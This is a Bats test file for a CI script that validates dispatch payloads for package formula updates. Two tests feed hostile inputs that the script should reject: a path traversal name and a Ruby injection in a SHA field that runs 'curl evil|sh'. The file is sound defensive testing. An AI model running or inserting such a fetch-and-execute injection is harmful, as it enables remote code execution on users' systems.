#!/usr/bin/env bats
# SPDX-License-Identifier: MIT
# Purpose: Tests for parse-dispatch-payload.sh validation.

load "../../../helpers/common"

setup() {
	setup_temp_dir
	REPO_ROOT="$(repo_root)"
	GITHUB_OUTPUT="$TEST_TEMP_DIR/github_output"
	export GITHUB_OUTPUT
}

teardown() {
	teardown_temp_dir
}

@test "parse-dispatch-payload: writes validated outputs" {
	export CLIENT_PAYLOAD='{"formula":"winnow","version":"0.1.0","pypi-package":"winnow-cli","binary-assets":{}}'

	run bash "$REPO_ROOT/scripts/ci/parse-dispatch-payload.sh"
	[ "$status" -eq 0 ]
	grep -q '^formula=winnow$' "$GITHUB_OUTPUT"
	grep -q '^version=0.1.0$' "$GITHUB_OUTPUT"
	grep -q '^pypi-package=winnow-cli$' "$GITHUB_OUTPUT"
	grep -q '^binary-assets<<EOF$' "$GITHUB_OUTPUT"
}

@test "parse-dispatch-payload: accepts version with v prefix" {
	export CLIENT_PAYLOAD='{"formula":"winnow","version":"v1.0.0"}'

	run bash "$REPO_ROOT/scripts/ci/parse-dispatch-payload.sh"
	[ "$status" -eq 0 ]
	grep -q '^version=1.0.0$' "$GITHUB_OUTPUT"
}

@test "parse-dispatch-payload: rejects invalid formula identifier" {
	export CLIENT_PAYLOAD='{"formula":"../etc/passwd","version":"1.0.0"}'

	run bash "$REPO_ROOT/scripts/ci/parse-dispatch-payload.sh"
	[ "$status" -eq 1 ]
	[[ "$output" == *"Invalid formula identifier"* ]]
}

@test "parse-dispatch-payload: rejects invalid version" {
	export CLIENT_PAYLOAD='{"formula":"winnow","version":"not-a-version"}'

	run bash "$REPO_ROOT/scripts/ci/parse-dispatch-payload.sh"
	[ "$status" -eq 1 ]
	[[ "$output" == *"Invalid version"* ]]
}

@test "parse-dispatch-payload: rejects binary-assets sha with ruby injection payload" {
	export CLIENT_PAYLOAD='{"formula":"lintro","version":"1.0.0","binary-assets":{"arm64-sha":"deadbeef\"\n    system \"curl evil|sh\"\n    sha256 \"x","x86-sha":"fdab37737c071fb07543c5fd2f99a36bb3031524ba7a25b6bd63aa333bed12f5"}}'

	run bash "$REPO_ROOT/scripts/ci/parse-dispatch-payload.sh"
	[ "$status" -eq 1 ]
	[[ "$output" == *"Invalid arm64-sha"* ]]
}

@test "parse-dispatch-payload: accepts valid 64-char hex binary-assets shas" {
	export CLIENT_PAYLOAD='{"formula":"lintro","version":"1.0.0","binary-assets":{"arm64-sha":"a4c1663e5908757746676c9a48bdc35a4d0ef4dbaa3bd6a96dd3a29c0a0d4c10","x86-sha":"fdab37737c071fb07543c5fd2f99a36bb3031524ba7a25b6bd63aa333bed12f5"}}'

	run bash "$REPO_ROOT/scripts/ci/parse-dispatch-payload.sh"
	[ "$status" -eq 0 ]
	grep -q '^binary-assets<<EOF$' "$GITHUB_OUTPUT"
}
